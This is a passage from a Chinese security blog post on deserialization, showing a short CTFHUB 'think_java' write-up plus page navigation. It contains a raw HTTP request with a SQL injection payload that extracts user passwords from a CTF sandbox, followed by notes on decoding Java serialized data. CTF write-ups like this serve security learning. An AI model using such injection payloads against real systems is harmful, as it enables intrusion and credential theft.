<h2 id="4-2-CTFHUB-—-think-java"><a href="#4-2-CTFHUB-—-think-java" class="headerlink" title="4.2 CTFHUB —- think_java"></a>4.2 CTFHUB —- think_java</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /common/test/sqlDict HTTP/1.1</span><br><span class="line">Host: challenge-516f101de06176a6.sandbox.ctfhub.com:10080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">dbName=myapp?a=&#x27; union select (select pwd from user)#</span><br></pre></td></tr></table></figure>

<p>SQL注入获取用户账号吗和密码</p>
<p>登陆成功</p>
<p>对方回显数据：一段 ro0AB开头的数据</p>
<p>先进行base64解密</p>
<p>使用serializationDumper工具进行解析反序列话的数据</p>
<p>java -jar SerializationDumper.jar base64</p>
<p><img src="https://i.loli.net/2021/09/15/jJ5y4FCiGpXvRWZ.png" alt="image-20210504180422065"></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/niceyoo/p/10596657.html">https://www.cnblogs.com/niceyoo/p/10596657.html</a></p>
<p><img src="https://i.loli.net/2021/09/15/3iUZ8msAvRtHIjb.png" alt="image-20210504155703612"></p>

      
    </div>
    <footer class="article-footer">
      
        <div id="donation_div"></div>


<script src="/js/vdonate.js"></script>

<script>
var a = new Donate({
  title: '如果觉得我的文章对您有用，请随意打赏。您的支持将鼓励我继续创作!', // 可选参数，打赏标题
  btnText: 'Donate', // 可选参数，打赏按钮文字
  el: document.getElementById('donation_div'),
  wechatImage: 'https://i.loli.net/2021/07/09/UNXc5a6nbWxgzru.png',
  alipayImage: 'https://i.loli.net/2021/07/09/Sf9nJd8hkOypTar.png'
});
</script>
      
      
      <div>
        <ul class="post-copyright">
          <li class="post-copyright-author">
          <strong>Post author:  </strong>xizhi-future</a>
          </li>
          <li class="post-copyright-link">
          <strong>Post link:  </strong>
          <a href="/2021/10/07/序列化与反序列化/" target="_blank" title="序列化与反序列化">https://xizhi-future.github.io/2021/10/07/序列化与反序列化/</a>
          </li>
          <li class="post-copyright-license">
            <strong>Copyright Notice:   </strong>
            All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
            unless stating additionally.
          </li>
         
        </ul>
<div>

      
      
        
	<div id="comment">
		<!-- 来必力City版安装代码 -->
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
		<script type="text/javascript">
		   (function(d, s) {
		       var j, e = d.getElementsByTagName(s)[0];

		       if (typeof LivereTower === 'function') { return; }

		       j = d.createElement(s);
		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
		       j.async = true;

		       e.parentNode.insertBefore(j, e);
		   })(document, 'script');
		</script>
		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
		</div>
		<!-- City版安装代码已完成 -->
	</div>



      
      
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">序列化与反序列化</a></li></ul>

      

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2021/10/08/1.7-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          1.7 计算机网络的体系结构
        
      </div>
    </a>
  
  
    <a href="/2021/10/07/SQL%20%E6%B3%A8%E5%85%A5%E5%85%A8%E8%A7%A3/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">SQL注入全解</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="toc-sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Contents</strong>
    
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.</span> <span class="nav-text">序列化与反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81-PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.</span> <span class="nav-text">一、 PHP 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E6%A0%BC%E5%BC%8F"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E7%89%B9%E6%80%A7"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 特性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E8%A7%A6%E5%8F%91"><span class="nav-number">2.3.</span> <span class="nav-text">1.3 php 反序列化的触发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-%E6%97%A0%E7%B1%BB%E7%AE%80%E5%8D%95%E9%A2%98%E7%9B%AE"><span class="nav-number">2.4.</span> <span class="nav-text">1.4 无类简单题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-5-%E6%9C%89%E7%B1%BB%E7%AE%80%E5%8D%95%E9%A2%98%E7%9B%AE"><span class="nav-number">2.5.</span> <span class="nav-text">1.5 有类简单题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-5-CTF-%E9%A2%98%E7%9B%AE"><span class="nav-number">2.6.</span> <span class="nav-text">1.5 CTF 题目</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-1-CTFHUB-AreUSerialz"><span class="nav-number">2.6.1.</span> <span class="nav-text">1.5.1 CTFHUB AreUSerialz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-2-%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E5%8D%81%E6%9C%88%E5%9C%BA"><span class="nav-number">2.6.2.</span> <span class="nav-text">1.5.2 “百度杯”CTF比赛 十月场</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-number">2.7.</span> <span class="nav-text">1.6 反序列化绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-1-php7-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E7%B1%BB%E5%B1%9E%E6%80%A7%E4%B8%8D%E6%95%8F%E6%84%9F"><span class="nav-number">2.7.1.</span> <span class="nav-text">1.6.1 php7.1+反序列化对类属性不敏感</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-2-wakeup-%E7%BB%95%E8%BF%87"><span class="nav-number">2.7.2.</span> <span class="nav-text">1.6.2 __wakeup() 绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-3-%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87"><span class="nav-number">2.7.3.</span> <span class="nav-text">1.6.3 正则绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-4-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E8%BF%87%E6%BB%A4"><span class="nav-number">2.7.4.</span> <span class="nav-text">1.6.4 十六进制绕过字符过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-5-%E5%BC%95%E7%94%A8"><span class="nav-number">2.7.5.</span> <span class="nav-text">1.6.5 引用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="nav-number">3.</span> <span class="nav-text">二、反序列化字符串逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E7%9F%A5%E8%AF%86%E4%B8%80%EF%BC%9A"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 知识一：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E7%9F%A5%E8%AF%86%E4%BA%8C%EF%BC%9A"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 知识二：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-%E5%AD%97%E7%AC%A6%E5%A2%9E%E5%A4%9A-%E2%80%94-CTF-Show-264"><span class="nav-number">3.3.</span> <span class="nav-text">2.3 字符增多 — CTF Show 264</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-4-%E5%AD%97%E7%AC%A6%E5%A2%9E%E5%A4%9A-%E2%80%94-0CTF-2016-piapiapia"><span class="nav-number">3.4.</span> <span class="nav-text">2.4 字符增多 — [0CTF 2016]piapiapia</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-5-%E5%AD%97%E7%AC%A6%E5%87%8F%E5%B0%91-%E2%80%94-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="nav-number">3.5.</span> <span class="nav-text">2.5 字符减少 — [安洵杯 2019]easy_serialize_php</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81phar-%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">4.</span> <span class="nav-text">三、phar 序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-phar-%E4%BB%8B%E7%BB%8D"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 phar 介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-phar-%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 phar 文件结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-%E6%B5%8B%E8%AF%95%EF%BC%9Aphar-%E6%96%87%E4%BB%B6%E7%9A%84%E6%9E%84%E9%80%A0"><span class="nav-number">4.3.</span> <span class="nav-text">3.3 测试：phar 文件的构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-4-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">4.4.</span> <span class="nav-text">3.4 常见利用：文件上传+文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-5-%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%9A%E8%BF%87%E6%BB%A4-phar"><span class="nav-number">4.5.</span> <span class="nav-text">3.5 绕过姿势：过滤 phar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-6-php-session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">4.6.</span> <span class="nav-text">3.6 php-session 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-6-1-%E5%85%B3%E4%BA%8E-php-%E4%B8%AD%E7%9A%84-session-%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6"><span class="nav-number">4.6.1.</span> <span class="nav-text">3.6.1 关于 php 中的 session 存储机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-6-2-php-session-%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95%EF%BC%9A%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-number">4.6.2.</span> <span class="nav-text">3.6.2 php-session 序列化简单测试：利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-6-3-php-session-%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="nav-number">4.6.3.</span> <span class="nav-text">3.6.3 php-session 序列化实际利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-6-4-CTF-%E9%A2%98%E7%9B%AE"><span class="nav-number">4.6.4.</span> <span class="nav-text">3.6.4 CTF 题目</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%9F%E6%9F%A5"><span class="nav-number">5.</span> <span class="nav-text">速查</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E6%AF%8F%E4%B8%AA%E5%AD%97%E6%AF%8D%E7%9A%84%E8%A1%A8%E7%A4%BA"><span class="nav-number">5.0.1.</span> <span class="nav-text">序列化中每个字母的表示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-%E5%8D%B1%E5%AE%B3"><span class="nav-number">5.1.</span> <span class="nav-text">1.3 危害</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81JAVA-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">6.</span> <span class="nav-text">四、JAVA 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-WebGoat"><span class="nav-number">6.1.</span> <span class="nav-text">4.1 WebGoat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-CTFHUB-%E2%80%94-think-java"><span class="nav-number">6.2.</span> <span class="nav-text">4.2 CTFHUB —- think_java</span></a></li></ol></li></ol>
    
    </div>
  </aside>

</section>
        
      </div>
      
      <footer id="footer">
  

  <div class="container">
      	<div class="row">
	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
	      <p id="copyRightEn">Copyright &copy; 2013 - 2021 忆 执 昔 来 的 旅 途 All Rights Reserved.</p>
	      
	      
    		<p class="busuanzi_uv">
				UV : <span id="busuanzi_value_site_uv"></span> |  
				PV : <span id="busuanzi_value_site_pv"></span>
		    </p>
  		   
		</div>

		
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");
    var allheader = document.getElementById("allheader");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    if (allheader != null) {
      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    } else {
      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    }
</script>
    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/categories" class="mobile-nav-link">Categories</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/essayists" class="mobile-nav-link">Essayists</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/scripts.js"></script>





  
<script src="/js/dialog.js"></script>









	<div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>



	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>






  </div>

  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h2 class="modal-title" id="myModalLabel">设置</h2>
      </div>
      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">


      <div class="modal-body">
          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
              正文字号大小
            </a>
          </div>
          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
          <div class="panel-body">
            您已调整页面字体大小
          </div>
        </div>
      


          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
              夜间护眼模式
            </a>
        </div>
          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
          <div class="panel-body">
            夜间模式已经开启，再次单击按钮即可关闭 
          </div>
        </div>

        <div>
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
        </div>
         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
          <div class="panel-body">
            忆 执 昔 来 的 旅 途
          </div>
          <div class="panel-body">
            Copyright © 2021 xizhi-future All Rights Reserved.
          </div>
        </div>
      </div>


      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <div class="modal-footer">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
      </div>
    </div>
  </div>
</div>
  
  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
  
    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
  
</body>
</html>